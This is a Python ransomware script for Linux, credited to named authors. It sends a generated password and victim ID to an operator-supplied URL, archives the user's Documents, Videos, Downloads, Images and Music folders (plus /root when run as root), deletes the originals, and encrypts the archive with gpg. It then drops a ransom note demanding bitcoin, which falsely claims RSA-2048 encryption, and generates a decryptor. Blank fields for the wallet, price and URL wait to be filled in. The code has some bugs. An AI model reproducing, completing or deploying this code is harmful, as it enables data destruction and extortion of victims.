#!/usr/bin/python3

# By SICARI0 x R3YW1N 

# Modules we need
import os
import pwd
import sys
import subprocess
import random
import string
import requests
import re

def linux():
    # Check if it's a superuser
    if os.geteuid() == 0:
        directories.append('/root/')

    # Generate an encryption password
    s = string.ascii_lowercase + string.digits
    password = str(''.join(random.sample(s, 30)))

    # Generate a unique ID
    t = string.ascii_lowercase
    unique_id = str(''.join(random.sample(s, 10)))

    # Execute necessary functions to encrypt data
    sendCred(url, password, unique_id)
    crypt(directories, password)
    howto(directories, bitcoin, price)
    decryptGen(str(directories))

def sendCred(url, password, unique_id):
    values = {'pass': password, 'id': unique_id}
    r = requests.post(url, values)
    page = r.text
    if page != 'Ok.':
        sys.exit('Oh! An error occurred while sending credentials')

def crypt(directory, password):
    if type(directory) != list:
        sys.exit('Incorrect format received')

    for dirr in directory:
        os.chdir(dirr)
        os.system('tar cvf encrypted.tar *')
        os.system('find . ! -name encrypted.tar -type f -delete')
        os.system('find . ! -name encrypted.tar -type d -delete')
        os.system('echo ' + password + ' | gpg --passphrase-fd 0 -c encrypted.tar')
        os.system('rm encrypted.tar')
        os.system('../')
        print("------------")

def howto(directory, bitcoin, price):
    txt = '\n'
    txt += "Hello, you may be wondering what happened to your files?\n"
    txt += "They were all encrypted with RSA-2048\n"
    txt += "If you want to recover them, you must pay: " + str(price) + "\n"
    txt += "My bitcoin address is: " + bitcoin + "\n"
    txt += "1 bitcoin -= approximately 240 US $\n"
    txt += "When you receive the password, use the decrypt.py file\n"
    txt += "Have a nice day and better luck next time :)"
    archivo = open("recover-my-files.txt", "wb")
    archivo.write(txt)
    archivo.close()
    for dirr in directory:
        os.system("cp 'recover-my-files.txt' " + dirr)

def decryptGen(directory):
    txt = ""
    txt += "#!/usr/bin/python3\n"
    txt += "import os\n"
    txt += "import sys\n"
    txt += "directory = " + directory + "\n"
    txt += "password = input('Enter the password to decrypt the files: ')\n"
    txt += "for dirr in directory:\n"
    txt += "    os.chdir(dirr)\n"
    txt += "    if os.system('gpg --passphrase ' + password + ' -d encrypted.tar.gpg > unencrypted.tar') != 0:\n"
    txt += "        sys.exit('Incorrect password!')\n"
    txt += "    os.system('tar xvf unencrypted.tar')\n"
    txt += "    os.system('rm unencrypted.tar')\n"
    txt += "    os.system('rm encrypted.tar.gpg')\n"
    txt += "    os.system('rm unencrypted.tar')\n"
    txt += "    os.system('rm recover-my-files.txt')\n"
    txt += "    os.system('../')\n"
    archivo = open("decrypt.py", "wb")
    archivo.write(txt)
    archivo.close()

directories = ['Documents', 'Videos', 'Downloads', 'Images', 'Music']  # Directories to encrypt
bitcoin = ''  # Your bitcoin account
price = ''  # Enter the amount to request
url = ''  # Enter the URL where you will send the ID and password

# Check if the operating system is Linux
if sys.platform == 'linux' or sys.platform == 'linux2':
    linux()
elif sys.platform == 'Windows':
    sys.exit('Soon supported!')
else:
    sys.exit('Not supported!')
